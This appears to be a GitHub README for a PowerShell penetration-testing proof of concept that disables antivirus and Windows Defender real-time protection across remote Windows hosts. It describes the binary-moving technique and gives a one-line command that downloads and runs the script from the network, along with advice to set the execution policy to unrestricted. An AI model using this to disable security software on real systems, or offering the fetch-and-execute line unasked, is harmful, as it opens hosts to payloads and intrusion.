# Invoke-NeutralizeAV
Quick PoC I Wrote for Bypassing Next Gen AV Remotely for Pentesting

My projects are my own and do not reflect my employer

# Description
I created this PoC based on a recent discovery of mine during a penetration test where I had SYSTEM access but could not stop AV processes or Services.  I found that simply moving the binaries on disk to another directory essentially neutralized the running AV process.  Use this script to effectively shut down AV across an enterprise environment so you can execute your payloads, etc.  There's also an "Enable" switch to set everything back when finished.  I recently added support to remotely and temporarily disable "Real Time Protection" for Windows Defender as well if it's detected on the remote host.

# Instructions
The assumption is being made that you are first running as SYSTEM or at least a Local or Domain Admin that can elevate to SYSTEM on a Windows OS with PowerShell.  If AV is enabled on the host you plan to run this scipt on, it will likely need to be neutralized there first before this can be leveraged to disable remote targets.  I was forced to remove my blog that explains in detail how this works.

Paste the following into the elevated CMD prompt to download the PS1 script.  (Note: You may need to first enable scripts on the host with `Set-ExecutionPolicy unrestricted`)

1) `powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/curtbraz/Invoke-NeutralizeAV/master/Invoke-NeutralizeAV.ps1')`

2) Enjoy! :)

<p align="center"><img align="center" width="600" alt="Invoke-NeutralizeAV Screenshot" src="https://i.imgur.com/IH7epMX.png"></p>

# Closing Thoughts
This is a quick and dirty PoC.  I plan to fix it up and add more functionality soon (arguments instead of prompts, host lists, disabling services & other bypass methods first, quiet mode, etc), but hopefully in the meantime this will assist people to more quickly bypass next gen AV on remote hosts during a pentest.  I wrote this script in a dynamic way so I didn't have to keep an ongoing list of current AV Service Names.
